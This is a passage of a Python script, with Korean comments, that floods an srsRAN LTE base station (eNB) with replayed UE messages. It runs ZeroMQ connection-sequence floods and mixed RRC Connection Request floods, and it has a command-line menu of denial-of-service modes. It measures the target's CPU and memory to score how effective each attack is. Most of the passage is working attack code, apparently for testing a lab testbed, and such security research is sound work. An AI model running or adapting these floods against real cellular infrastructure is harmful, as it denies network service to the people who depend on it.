                        self.log_message(f"✓ 메모리 효과: {'증가' if memory_change > 0 else '감소'} ({memory_change:+.1f}%)")
                    if abs(srsran_cpu_change) > 5:
                        effectiveness += 1
                        self.log_message(f"✓ srsRAN CPU 효과: {'증가' if srsran_cpu_change > 0 else '감소'} ({srsran_cpu_change:+.1f}%)")
                    if abs(srsran_memory_change) > 2:
                        effectiveness += 1
                        self.log_message(f"✓ srsRAN 메모리 효과: {'증가' if srsran_memory_change > 0 else '감소'} ({srsran_memory_change:+.1f}%)")
                    
                    if effectiveness == 0:
                        self.log_message("✗ 공격 효과가 미미합니다")
                    elif effectiveness <= 2:
                        self.log_message(f"△ 공격 효과가 보통입니다 ({effectiveness}/4)")
                    else:
                        self.log_message(f"✓ 공격 효과가 큽니다 ({effectiveness}/4)")
        
        # 전체 효과 비교
        self.log_message(f"\n--- 전체 공격 효과 비교 ---")
        if all_results['total_start_stats'] and all_results['total_end_stats']:
            total_cpu_change = all_results['total_end_stats']['cpu_percent'] - all_results['total_start_stats']['cpu_percent']
            total_memory_change = all_results['total_end_stats']['memory_percent'] - all_results['total_start_stats']['memory_percent']
            total_srsran_cpu_change = all_results['total_end_stats']['srsran_cpu'] - all_results['total_start_stats']['srsran_cpu']
            total_srsran_memory_change = all_results['total_end_stats']['srsran_memory'] - all_results['total_start_stats']['srsran_memory']
            
            self.log_message(f"전체 CPU 변화: {total_cpu_change:+.1f}%")
            self.log_message(f"전체 메모리 변화: {total_memory_change:+.1f}%")
            self.log_message(f"전체 srsRAN CPU 변화: {total_srsran_cpu_change:+.1f}%")
            self.log_message(f"전체 srsRAN 메모리 변화: {total_srsran_memory_change:+.1f}%")
    
    def save_all_attack_results(self, all_results, total_start_time, total_end_time):
        """모든 공격 결과를 JSON 파일로 저장"""
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        results_file = f"{self.log_dir}/all_attacks_results_{timestamp}.json"
        
        results = {
            'attack_info': {
                'type': 'all_attacks',
                'total_duration': (total_end_time - total_start_time).total_seconds(),
                'start_time': total_start_time.isoformat(),
                'end_time': total_end_time.isoformat(),
                'target_port': self.target_port
            },
            'total_start_stats': all_results['total_start_stats'],
            'total_end_stats': all_results['total_end_stats'],
            'attack_results': all_results['attack_results'],
            'real_messages_used': [
                msg.hex() for msg in self.real_messages
            ]
        }
        
        with open(results_file, 'w', encoding='utf-8') as f:
            json.dump(results, f, indent=2, ensure_ascii=False)
        
        self.log_message(f"전체 공격 결과 저장: {results_file}")
    
    def zeromq_sequence_flood(self, duration=60):
        """ZeroMQ 연결 시퀀스 플러딩"""
        self.setup_logging("zeromq_sequence", duration)
        
        # 공격 시작 전 리소스 상태 캡처
        self.log_message("공격 시작 전 리소스 상태 캡처 중...")
        self.start_stats = self.get_system_stats()
        self.start_time = datetime.now()
        
        if self.start_stats:
            self.log_message(f"시작 CPU: {self.start_stats['cpu_percent']:.1f}%")
            self.log_message(f"시작 메모리: {self.start_stats['memory_percent']:.1f}% ({self.start_stats['memory_used_gb']:.2f}GB)")
            self.log_message(f"시작 네트워크 송신: {self.start_stats['bytes_sent']:,} bytes")
            self.log_message(f"시작 네트워크 수신: {self.start_stats['bytes_recv']:,} bytes")
            self.log_message(f"시작 srsRAN CPU: {self.start_stats['srsran_cpu']:.1f}%")
            self.log_message(f"시작 srsRAN 메모리: {self.start_stats['srsran_memory']:.1f}%")
        
        self.log_message("=" * 50)
        self.log_message(f"=== ZeroMQ 연결 시퀀스 플러딩 시작 ===")
        self.log_message(f"대상 포트: {self.target_port}")
        self.log_message(f"지속 시간: {duration}초")
        self.log_message("=" * 50)
        
        self.running = True
        start_time = time.time()
        count = 0
        
        while self.running and (time.time() - start_time) < duration:
            self.send_zeromq_sequence()
            count += 1
            time.sleep(0.5)  # 500ms 간격
        
        # 공격 종료 후 리소스 상태 캡처
        self.log_message("=" * 50)
        self.log_message("공격 종료 후 리소스 상태 캡처 중...")
        self.end_stats = self.get_system_stats()
        self.end_time = datetime.now()
        
        if self.end_stats:
            self.log_message(f"종료 CPU: {self.end_stats['cpu_percent']:.1f}%")
            self.log_message(f"종료 메모리: {self.end_stats['memory_percent']:.1f}% ({self.end_stats['memory_used_gb']:.2f}GB)")
            self.log_message(f"종료 네트워크 송신: {self.end_stats['bytes_sent']:,} bytes")
            self.log_message(f"종료 네트워크 수신: {self.end_stats['bytes_recv']:,} bytes")
            self.log_message(f"종료 srsRAN CPU: {self.end_stats['srsran_cpu']:.1f}%")
            self.log_message(f"종료 srsRAN 메모리: {self.end_stats['srsran_memory']:.1f}%")
        
        # 리소스 변화량 계산 및 출력
        if self.start_stats and self.end_stats:
            self.log_message("=" * 50)
            self.log_message("=== 리소스 변화량 분석 ===")
            
            cpu_change = self.end_stats['cpu_percent'] - self.start_stats['cpu_percent']
            memory_change = self.end_stats['memory_percent'] - self.start_stats['memory_percent']
            memory_gb_change = self.end_stats['memory_used_gb'] - self.start_stats['memory_used_gb']
            bytes_sent_change = self.end_stats['bytes_sent'] - self.start_stats['bytes_sent']
            bytes_recv_change = self.end_stats['bytes_recv'] - self.start_stats['bytes_recv']
            srsran_cpu_change = self.end_stats['srsran_cpu'] - self.start_stats['srsran_cpu']
            srsran_memory_change = self.end_stats['srsran_memory'] - self.start_stats['srsran_memory']
            
            self.log_message(f"CPU 변화: {cpu_change:+.1f}%")
            self.log_message(f"메모리 변화: {memory_change:+.1f}% ({memory_gb_change:+.2f}GB)")
            self.log_message(f"네트워크 송신 변화: {bytes_sent_change:+,} bytes")
            self.log_message(f"네트워크 수신 변화: {bytes_recv_change:+,} bytes")
            self.log_message(f"srsRAN CPU 변화: {srsran_cpu_change:+.1f}%")
            self.log_message(f"srsRAN 메모리 변화: {srsran_memory_change:+.1f}%")
            
            # 공격 효과 분석
            self.log_message("=" * 50)
            self.log_message("=== 공격 효과 분석 ===")
            if abs(cpu_change) > 5:
                self.log_message(f"✓ CPU 사용량이 {'증가' if cpu_change > 0 else '감소'}했습니다 ({cpu_change:+.1f}%)")
            else:
                self.log_message(f"✗ CPU 사용량 변화가 미미합니다 ({cpu_change:+.1f}%)")
            
            if abs(memory_change) > 2:
                self.log_message(f"✓ 메모리 사용량이 {'증가' if memory_change > 0 else '감소'}했습니다 ({memory_change:+.1f}%)")
            else:
                self.log_message(f"✗ 메모리 사용량 변화가 미미합니다 ({memory_change:+.1f}%)")
            
            if abs(srsran_cpu_change) > 5:
                self.log_message(f"✓ srsRAN CPU 사용량이 {'증가' if srsran_cpu_change > 0 else '감소'}했습니다 ({srsran_cpu_change:+.1f}%)")
            else:
                self.log_message(f"✗ srsRAN CPU 사용량 변화가 미미합니다 ({srsran_cpu_change:+.1f}%)")
            
            if abs(srsran_memory_change) > 2:
                self.log_message(f"✓ srsRAN 메모리 사용량이 {'증가' if srsran_memory_change > 0 else '감소'}했습니다 ({srsran_memory_change:+.1f}%)")
            else:
                self.log_message(f"✗ srsRAN 메모리 사용량 변화가 미미합니다 ({srsran_memory_change:+.1f}%)")
        
        # 결과를 JSON 파일로 저장
        self.save_attack_results(count, duration)
        
        self.log_message("=" * 50)
        self.log_message(f"=== 플러딩 완료 ===")
        self.log_message(f"총 {count}개 시퀀스 전송")
        self.log_message(f"공격 시간: {(self.end_time - self.start_time).total_seconds():.1f}초")
        self.log_message("=" * 50)
    
    def mixed_flood(self, duration=60):
        """혼합 플러딩 (RRC + ZeroMQ 시퀀스)"""
        self.setup_logging("mixed", duration)
        
        # 공격 시작 전 리소스 상태 캡처
        self.log_message("공격 시작 전 리소스 상태 캡처 중...")
        self.start_stats = self.get_system_stats()
        self.start_time = datetime.now()
        
        if self.start_stats:
            self.log_message(f"시작 CPU: {self.start_stats['cpu_percent']:.1f}%")
            self.log_message(f"시작 메모리: {self.start_stats['memory_percent']:.1f}% ({self.start_stats['memory_used_gb']:.2f}GB)")
            self.log_message(f"시작 네트워크 송신: {self.start_stats['bytes_sent']:,} bytes")
            self.log_message(f"시작 네트워크 수신: {self.start_stats['bytes_recv']:,} bytes")
            self.log_message(f"시작 srsRAN CPU: {self.start_stats['srsran_cpu']:.1f}%")
            self.log_message(f"시작 srsRAN 메모리: {self.start_stats['srsran_memory']:.1f}%")
        
        self.log_message("=" * 50)
        self.log_message(f"=== 혼합 플러딩 (RRC + ZeroMQ) 시작 ===")
        self.log_message(f"대상 포트: {self.target_port}")
        self.log_message(f"지속 시간: {duration}초")
        self.log_message("=" * 50)
        
        self.running = True
        start_time = time.time()
        count = 0
        
        while self.running and (time.time() - start_time) < duration:
            # 50% 확률로 RRC 메시지 또는 ZeroMQ 시퀀스
            if random.random() < 0.5:
                message = self.real_messages[2]  # RRC Connection Request
                self.send_real_message(message, f"RRC Connection Request #{count+1}")
            else:
                self.send_zeromq_sequence()
            
            count += 1
            time.sleep(0.1)  # 100ms 간격
        
        # 공격 종료 후 리소스 상태 캡처
        self.log_message("=" * 50)
        self.log_message("공격 종료 후 리소스 상태 캡처 중...")
        self.end_stats = self.get_system_stats()
        self.end_time = datetime.now()
        
        if self.end_stats:
            self.log_message(f"종료 CPU: {self.end_stats['cpu_percent']:.1f}%")
            self.log_message(f"종료 메모리: {self.end_stats['memory_percent']:.1f}% ({self.end_stats['memory_used_gb']:.2f}GB)")
            self.log_message(f"종료 네트워크 송신: {self.end_stats['bytes_sent']:,} bytes")
            self.log_message(f"종료 네트워크 수신: {self.end_stats['bytes_recv']:,} bytes")
            self.log_message(f"종료 srsRAN CPU: {self.end_stats['srsran_cpu']:.1f}%")
            self.log_message(f"종료 srsRAN 메모리: {self.end_stats['srsran_memory']:.1f}%")
        
        # 리소스 변화량 계산 및 출력
        if self.start_stats and self.end_stats:
            self.log_message("=" * 50)
            self.log_message("=== 리소스 변화량 분석 ===")
            
            cpu_change = self.end_stats['cpu_percent'] - self.start_stats['cpu_percent']
            memory_change = self.end_stats['memory_percent'] - self.start_stats['memory_percent']
            memory_gb_change = self.end_stats['memory_used_gb'] - self.start_stats['memory_used_gb']
            bytes_sent_change = self.end_stats['bytes_sent'] - self.start_stats['bytes_sent']
            bytes_recv_change = self.end_stats['bytes_recv'] - self.start_stats['bytes_recv']
            srsran_cpu_change = self.end_stats['srsran_cpu'] - self.start_stats['srsran_cpu']
            srsran_memory_change = self.end_stats['srsran_memory'] - self.start_stats['srsran_memory']
            
            self.log_message(f"CPU 변화: {cpu_change:+.1f}%")
            self.log_message(f"메모리 변화: {memory_change:+.1f}% ({memory_gb_change:+.2f}GB)")
            self.log_message(f"네트워크 송신 변화: {bytes_sent_change:+,} bytes")
            self.log_message(f"네트워크 수신 변화: {bytes_recv_change:+,} bytes")
            self.log_message(f"srsRAN CPU 변화: {srsran_cpu_change:+.1f}%")
            self.log_message(f"srsRAN 메모리 변화: {srsran_memory_change:+.1f}%")
            
            # 공격 효과 분석
            self.log_message("=" * 50)
            self.log_message("=== 공격 효과 분석 ===")
            if abs(cpu_change) > 5:
                self.log_message(f"✓ CPU 사용량이 {'증가' if cpu_change > 0 else '감소'}했습니다 ({cpu_change:+.1f}%)")
            else:
                self.log_message(f"✗ CPU 사용량 변화가 미미합니다 ({cpu_change:+.1f}%)")
            
            if abs(memory_change) > 2:
                self.log_message(f"✓ 메모리 사용량이 {'증가' if memory_change > 0 else '감소'}했습니다 ({memory_change:+.1f}%)")
            else:
                self.log_message(f"✗ 메모리 사용량 변화가 미미합니다 ({memory_change:+.1f}%)")
            
            if abs(srsran_cpu_change) > 5:
                self.log_message(f"✓ srsRAN CPU 사용량이 {'증가' if srsran_cpu_change > 0 else '감소'}했습니다 ({srsran_cpu_change:+.1f}%)")
            else:
                self.log_message(f"✗ srsRAN CPU 사용량 변화가 미미합니다 ({srsran_cpu_change:+.1f}%)")
            
            if abs(srsran_memory_change) > 2:
                self.log_message(f"✓ srsRAN 메모리 사용량이 {'증가' if srsran_memory_change > 0 else '감소'}했습니다 ({srsran_memory_change:+.1f}%)")
            else:
                self.log_message(f"✗ srsRAN 메모리 사용량 변화가 미미합니다 ({srsran_memory_change:+.1f}%)")
        
        # 결과를 JSON 파일로 저장
        self.save_attack_results(count, duration)
        
        self.log_message("=" * 50)
        self.log_message(f"=== 플러딩 완료 ===")
        self.log_message(f"총 {count}개 메시지/시퀀스 전송")
        self.log_message(f"공격 시간: {(self.end_time - self.start_time).total_seconds():.1f}초")
        self.log_message("=" * 50)

def main():
    import argparse
    
    parser = argparse.ArgumentParser(description='실제 UE 메시지를 사용한 공격')
    parser.add_argument('--target-port', type=int, default=2001, help='eNB 포트 (기본값: 2001)')
    parser.add_argument('--duration', type=int, default=60, help='공격 지속 시간 (초)')
    parser.add_argument('--attack-type', choices=['rrc', 'zeromq', 'mixed', 'aggressive', 'advanced', 'real', 'test', 'analyze', 'all'], 
                       default='mixed', help='공격 유형')
    
    args = parser.parse_args()
    
    attacker = RealUEAttack(args.target_port)
    
    try:
        if args.attack_type == 'rrc':
            attacker.rrc_connection_flood(args.duration)
        elif args.attack_type == 'zeromq':
            attacker.zeromq_sequence_flood(args.duration)
        elif args.attack_type == 'aggressive':
            attacker.aggressive_rrc_flood(args.duration)
        elif args.attack_type == 'advanced':
            attacker.advanced_dos_attack(args.duration)
        elif args.attack_type == 'real':
            attacker.real_srsran_attack(args.duration)
        elif args.attack_type == 'test':
            attacker.test_basic_connection()
        elif args.attack_type == 'analyze':
            attacker.analyze_srsran_ue_connection()
        elif args.attack_type == 'all':
            attacker.run_all_attacks(args.duration)
        else:
            attacker.mixed_flood(args.duration)
    except KeyboardInterrupt:
        print("\n사용자에 의해 중단됨")
        attacker.running = False

if __name__ == "__main__":
    main()
